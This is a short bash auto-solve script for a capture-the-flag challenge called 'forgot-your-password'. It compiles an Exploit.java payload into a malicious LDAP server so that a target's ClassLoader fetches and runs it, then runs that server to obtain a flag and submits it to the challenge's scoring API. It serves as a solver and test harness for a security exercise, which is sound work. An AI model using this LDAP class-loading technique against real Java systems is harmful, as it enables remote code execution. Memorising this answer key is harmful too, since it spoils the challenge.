#!/bin/bash

set -e

apt-get update
apt-get install -y openjdk-17-jdk-headless maven

cd auto-solve
# compile the payload and allow the LDAP server's ClassLoader to access it
# (using older Java because older openjdk docker images are smaller)
javac Exploit.java -source 8 -target 8 -d ldap-server/src/main/resources/

cd ldap-server
mvn clean package
FLAG=$(java -jar target/ldap-server-1.0-SNAPSHOT.jar)

RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' \
   -X POST \
   -H 'Content-Type: application/json' \
   --data-binary "{\"challenge_id\": \"forgot-your-password\", \"task_id\": \"dashboard-content\", \"flag\" : \"$FLAG\"}")

if [[ $RES != *"Congratulations"* ]]; then
 echo "Failed to submit the flag - $RES"
 exit 5
fi

echo "OK - tests passed"
exit 0
